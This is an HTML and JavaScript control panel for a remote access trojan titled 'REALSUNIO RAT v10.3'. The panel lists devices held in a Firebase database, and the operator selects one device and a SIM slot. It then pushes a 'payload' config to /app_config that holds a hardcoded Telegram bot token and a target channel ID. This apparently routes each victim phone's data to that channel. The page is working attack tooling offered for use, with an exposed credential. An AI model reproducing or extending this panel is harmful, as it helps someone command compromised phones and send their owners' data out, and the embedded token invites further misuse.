<!DOCTYPE html>
<html>
<head>
    <title>REALSUNIO RAT v10.3</title>
    <style>
        :root { --cmd-green: #00ff41; --cmd-bg: #0d0d0d; --cmd-border: #333; --error-red: #ff3e3e; }
        body { font-family: 'Courier New', monospace; background: var(--cmd-bg); color: var(--cmd-green); padding: 20px; margin: 0; }
        .wrapper { max-width: 850px; margin: auto; border: 1px solid var(--cmd-border); padding: 20px; box-shadow: 0 0 30px rgba(0,255,65,0.05); }
        h1 { text-align: center; font-size: 1.5rem; letter-spacing: 5px; border-bottom: 1px solid var(--cmd-border); padding-bottom: 15px; margin-top: 0; }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }
        .box { border: 1px solid var(--cmd-border); padding: 15px; position: relative; }
        .box-title { position: absolute; top: -10px; left: 10px; background: var(--cmd-bg); padding: 0 8px; font-size: 12px; color: #888; }
        
        input, select { width: 100%; background: #000; border: 1px solid #444; color: var(--cmd-green); padding: 12px; margin-top: 10px; outline: none; border-radius: 3px; font-family: inherit; }
        
        button { width: 100%; padding: 15px; margin-top: 20px; background: transparent; border: 1px solid var(--cmd-green); color: var(--cmd-green); font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
        button:hover { background: var(--cmd-green); color: #000; box-shadow: 0 0 20px var(--cmd-green); }
        
        #log-screen { height: 250px; overflow-y: auto; background: #050505; border: 1px solid #222; margin-top: 20px; padding: 10px; font-size: 13px; scroll-behavior: smooth; }
        .log-entry { margin-bottom: 5px; border-left: 2px solid #333; padding-left: 10px; }
        .ts { color: #555; font-size: 11px; margin-right: 8px; }
        .type-success { color: var(--cmd-green); }
        .type-error { color: var(--error-red); }
        .type-info { color: #00ccff; }
        
        .refresh-btn { width: auto; padding: 5px 10px; font-size: 10px; margin: 0; position: absolute; right: 10px; top: 10px; }
    </style>
</head>
<body>

<div class="wrapper">
    <h1>[ REALSUNIO ENGINE TERMINAL ]</h1>

    <div class="grid">
        <div class="box">
            <span class="box-title">NETWORK_CONFIG</span>
            <label>TARGET_CHANNEL_ID</label>
            <input type="text" id="targetCid" placeholder="Example: -10023456789">
        </div>
        
        <div class="box">
            <span class="box-title">REMOTE_HARDWARE</span>
            <button class="refresh-btn" onclick="fetchActiveDevices()">RE-SCAN</button>
            <label>ACTIVE_DEVICE_LIST</label>
            <select id="devSelector">
                <option value="">SCANNING NODES...</option>
            </select>
            <select id="slotSelector" style="margin-top:10px;">
                <option value="1">USE_SIM_01</option>
                <option value="2">USE_SIM_02</option>
            </select>
        </div>
    </div>

    <button onclick="injectPayload()">DEPLOY_TO_FIREBASE_ENGINE</button>

    <div class="box" style="margin-top:25px;">
        <span class="box-title">LIVE_SYSTEM_LOGS</span>
        <div id="log-screen">Initializing secure connection to xooejtvks...</div>
    </div>
</div>

<script>
    const FIREBASE_URL = "https://xooejtvks-default-rtdb.firebaseio.com";

    // Deep Scan Logic for Devices
    async function fetchActiveDevices() {
        const selector = document.getElementById('devSelector');
        selector.innerHTML = '<option>SCANNING_DATABASE...</option>';
        
        try {
            const res = await fetch(`${FIREBASE_URL}/devices.json`);
            const nodes = await res.json();
            
            selector.innerHTML = '';
            
            if (!nodes) {
                selector.innerHTML = '<option value="">0_DEVICES_FOUND</option>';
                writeLog("No device nodes found in /devices path", "error");
                return;
            }

            // Extracting Data chahe wo Object ho ya Array
            Object.keys(nodes).forEach(key => {
                let data = nodes[key];
                // Try to find a name: model > deviceName > brand > key itself
                let displayName = data.model || data.deviceName || data.brand || key;
                let opt = document.createElement('option');
                opt.value = key;
                opt.innerHTML = `ONLINE: ${displayName.toUpperCase()} [ID: ${key}]`;
                selector.appendChild(opt);
            });
            
            writeLog("Device mapping synchronized successfully.", "success");
        } catch (e) {
            writeLog("Failed to reach Firebase node: " + e.message, "error");
        }
    }

    function injectPayload() {
        const payload = {
            channelId: document.getElementById('targetCid').value,
            active_device: document.getElementById('devSelector').value,
            active_sim_slot: document.getElementById('slotSelector').value,
            tgToken: "7978593529:AAFeC7_9nMxb9qVmWHGg4KJ63GPzjVQvIQo",
            last_sync: Date.now()
        };

        if(!payload.active_device) { writeLog("DEPLOY_FAILED: No target selected!", "error"); return; }

        fetch(`${FIREBASE_URL}/app_config.json`, {
            method: 'PATCH',
            body: JSON.stringify(payload)
        }).then(() => {
            writeLog(`Payload injected to /app_config. Target: ${payload.active_device}`, "info");
            // Also notify Python via logs
            fetch(`${FIREBASE_URL}/last_log.json`, {
                method: 'PUT',
                body: JSON.stringify({msg: "Dashboard Config Updated", type: "info", ts: Date.now()})
            });
        });
    }

    function writeLog(text, type) {
        const screen = document.getElementById('log-screen');
        const time = new Date().toLocaleTimeString();
        const entry = `<div class="log-entry"><span class="ts">[${time}]</span><span class="type-${type}">${text}</span></div>`;
        screen.innerHTML = entry + screen.innerHTML;
    }

    // Real-time Sync for Engine Logs (Bot & Python)
    setInterval(() => {
        fetch(`${FIREBASE_URL}/last_log.json`)
        .then(r => r.json())
        .then(data => {
            if(data && !document.getElementById('log-screen').innerHTML.includes(data.msg)) {
                writeLog(data.msg, data.type);
            }
        }).catch(() => {});
    }, 2500);

    // Bootstrap
    fetchActiveDevices();
</script>
</body>
</html>
